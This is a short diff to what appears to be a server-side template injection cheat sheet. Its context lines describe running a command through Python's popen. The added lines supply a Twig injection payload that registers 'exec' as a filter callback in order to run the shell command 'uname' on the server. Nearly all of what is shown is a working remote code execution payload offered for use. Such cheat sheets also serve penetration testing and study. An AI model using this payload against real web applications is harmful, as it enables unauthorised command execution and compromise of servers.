@@ -25,3 +25,6 @@ Where:
 `X` was found previously.
 `COMMAND` is the command you want to run.
 Make sure you read the Python documentation for the popen to make sure you have get the right syntax for the command (or add the right option).
+
+**Another injection for code execution**
+`{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`
